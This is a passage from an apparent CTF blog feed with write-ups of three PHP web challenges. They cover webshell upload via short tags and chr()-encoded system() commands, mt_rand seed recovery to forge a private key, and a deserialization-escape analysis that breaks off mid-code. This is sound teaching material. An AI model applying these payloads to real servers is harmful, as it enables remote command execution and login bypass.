    <content type="html"><![CDATA[<blockquote><p>摘要<br>trike</p><a id="more"></a></blockquote><h4><span id="源码">源码</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,$input))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$input</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array($input))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>($input <span class="keyword">as</span> $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&#x27;sandbox/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>($_GET[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> $dir;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        $data = $_GET[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>有过滤，针对数组检查，但幸好不算严……</p><p>短标签+拼接</p><h4><span id="flag">flag</span></h4><p><code>?action=upload&amp;data=&lt;?=system(chr(108).chr(115).chr(32).chr(47))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114540157.png" alt="image-20210831114540157"></p><p>cat</p><p><code>?action=upload&amp;data=&lt;?=system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(108).chr(49).chr(49).chr(49).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(50).chr(108).chr(97).chr(103))?&gt;</code></p><p><img src="/images/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write_shell/image-20210831114641896.png" alt="image-20210831114641896"></p><div class="toc" tabindex="1"><!-- toc --><!-- tocstop --></div><br>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;trike&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020-Ezaudit</title>
    <link href="http://example.com/2021/08/28/MRCTF2020-Ezaudit/"/>
    <id>http://example.com/2021/08/28/MRCTF2020-Ezaudit/</id>
    <published>2021-08-28T02:53:12.240Z</published>
    <updated>2021-08-29T11:30:16.755Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>文件泄露、伪随机数</p><a id="more"></a></blockquote><p>扫目录：</p><img src="/images/MRCTF2020-Ezaudit/image-20210828105532039.png" alt="image-20210828105532039" style="zoom:80%;"><p>文件泄露一个index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p><strong>$Public_key = KVQP0LdJKRaV3n9D  how to get crispr’s private_key???</strong></p><p>通过给出的一段字符，求此次生成随机数的种子</p><p>先转化为php_seed 要求的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">str1 =<span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] == str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="/images/MRCTF2020-Ezaudit/image-20210828110051232.png" alt="image-20210828110051232"></p><p>获取privatekey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="comment">//XuNhoueCDCGc</span></span><br></pre></td></tr></table></figure><p>虽说是index.php，但登录界面在login.html</p><img src="/images/MRCTF2020-Ezaudit/image-20210828110240781.png" alt="image-20210828110240781" style="zoom:80%;"><p>ok……</p><p>参考文章:<br><a href="https://www.freebuf.com/column/205240.html">CTF| web篇之伪随机数</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;文件泄露、伪随机数&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-Easyphp</title>
    <link href="http://example.com/2021/08/27/GYCTF2020-Easyphp/"/>
    <id>http://example.com/2021/08/27/GYCTF2020-Easyphp/</id>
    <published>2021-08-27T10:24:16.381Z</published>
    <updated>2021-08-27T16:15:31.701Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>文件泄露、代码审计、反序列化</p><a id="more"></a></blockquote><blockquote><p>半成品系统 留后门的程序员已经跑路</p></blockquote><p>一个用户登录框，有敏感词过滤，测试不像是sql注入</p><p>字典扫描：</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827210220812.png" alt="image-20210827210220812"></p><p>发现文件泄露</p><h4><span id="代码审计">代码审计</span></h4><img src="/images/GYCTF2020-Easyphp/image-20210827210234798.png" alt="image-20210827210234798" style="zoom:80%;"><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这个获取flag的方法，登录就行；fuzz的时候发现了<code>admin</code>账户是存在的</p><p>lib 类库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class User 用户操作</span><br><span class="line">class Info 用户信息</span><br><span class="line">Class UpdateHelper 信息更新帮助类 &#x2F;&#x2F;似乎没完善</span><br><span class="line">class dbCtrl 数据操作类</span><br></pre></td></tr></table></figure><p>登录逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class User   </span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();<span class="comment">//数据操作</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;<span class="comment">//用户id</span></span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;<span class="comment">//记录登录状态</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <strong>$mysqli=new dbCtrl();</strong></p><p>数据层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class dbCtrl</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123; <span class="comment">//session中的token可以理解为令牌，记录账户权限，admin权限则直接过，也就是后门？</span></span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123; <span class="comment">//结果集为空，则用户不存在</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;<span class="comment">//密码错误则登录失败</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;<span class="comment">//核验无误，记录登录token</span></span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们要利用这个“后门”，获取admin权限</p><h4><span id="反序列化">反序列化</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>unserialize($this-&gt;getNewinfo());</strong>    利用序列化传递实体类信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成<code>Info</code>类的实例，并<strong>序列化传递</strong></p><p>safe 检测：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换……如果可以构建<strong>反序列化字符串逃逸</strong>，那序列化字符串将是不安全的</p><p>找一下魔法方法：</p><p><img src="/images/GYCTF2020-Easyphp/image-20210827221951009.png" alt="image-20210827221951009"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: destruct</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>似乎是一个点，但不完全是……因为被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//UpdateHelper: destruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; tostring</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User: toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>-&gt; call</p><figure class="highlight php"><table><tr><td 